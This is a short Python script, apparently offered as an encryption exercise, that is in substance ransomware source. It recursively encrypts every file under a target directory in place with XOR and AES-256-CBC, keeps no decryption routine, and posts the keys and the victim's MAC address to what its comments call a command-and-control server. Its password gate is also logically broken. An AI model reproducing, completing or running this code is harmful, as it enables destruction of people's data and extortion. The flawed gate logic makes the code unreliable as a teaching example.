#!/usr/bin/python3

""" Made by Nicolas Mendes Oct 21, 2021
Made as an exercise of encryption and decryption
"""


# Importing all requirements
import os
import json
import sys
import requests
import base64
import urllib
import hashlib
import binascii
import getmac
from datetime import datetime
from colored import fg, bg, attr
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto import Random
from Crypto.Random import get_random_bytes

safeGuard = input("Enter a password: ")


# License and Obfuscation functions
def inference(name="", tag=True):
	'''
	if the current year is 2021 or 2022, then inference function will run successfully, otherwise fails.
	Here the attribute variable holds the string version of the date in MM-DD-YYYY format
	'''

	print(
	    f"Hello {name}, the inference function has been successfully started")

	attribute = str(datetime.now().strftime('%m-%d-%Y'))
	response = "You license has been expired, please contact us."
	year_to_expire = int(2022)

	try:
		assert int(attribute.split('-')[-1]) == year_to_expire, response
	except AssertionError as e:
		print(response)
		sys.exit()

	# Replace your main code to operate here.
	# if the above assertion is True, it will reach until this point, otherwise it will stop in the previous line.

	if tag:
		print("inference function has been completed successfully")
		return True
	else:
		return False


class Encryptor:
	def encrypt(self, file):
		print("{}[+] encrypting -> {}{}".format(fg(9), file, attr(0)))
		fd = open(file, "rb")
		data = binascii.hexlify(fd.read())
		fd.close()

		# XOR encryption
		xored_data = b""
		i = 0
		while i < len(data):
			xored_data += chr(data[i] ^ self.xor_key[i % len(self.xor_key)]).encode()
			i += 1

		# AES-256-CBC Encryption
		cipherEngine = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
		ciphertext = cipherEngine.encrypt(pad(xored_data, AES.block_size))

		# Write encrypted file to disk
		fd = open(file, "wb")
		fd.write(ciphertext)
		fd.close()

	def generateKeys(self):
		# Generate encryption keys
		print(f"{fg(10)}[*] generating encryption keys...{attr(0)}")
		self.xor_key = binascii.hexlify(Random.new().read(AES.block_size - 8))
		self.enc_key = hashlib.sha512(
			self.xor_key + Random.new().read(AES.block_size)).digest()
		self.iv = Random.new().read(AES.block_size)
		self.targetMAC = getmac.get_mac_address().encode()
		self.save_keys()

	def save_keys(self):
		# send encryption keys to command and control (C2) server
		print(f"{fg(10)}[*] saving keys to command and control server...{attr(0)}")
		cmdControlServer = "http://127.0.0.1:1337/save_keys"
		data = {"mac_address": self.encode_keys(self.targetMAC), "enc_key": self.encode_keys(
			self.enc_key), "xor_key": self.encode_keys(self.xor_key), "iv": self.encode_keys(self.iv)}
		response = requests.post(cmdControlServer, data=data)

	def dir_to_encrypt(self, dir_name):
		self.generateKeys()
		# what directory to encrypt
		print(f"{fg(10)}[*] encrypting '{dir_name}' directory{attr(0)}")
		for root, subdirs, files in os.walk(dir_name):
			for file in files:
				self.encrypt("{}/{}".format(root, file))

	def encode_keys(self, key):
		# encode keys before sending to C2 server
		return urllib.parse.quote(base64.b64encode(key))


if safeGuard != "start" or "dec":
    print("Incorrect password")
    exit()

if safeGuard == "start":
    Encryptor()

if safeGuard == "dec":
    pass

# Dirt Encrypt method
encryptor = Encryptor()
encryptor.dir_to_encrypt("/target")

if __name__ == "__main__":
	_ = inference(name="BSD3")
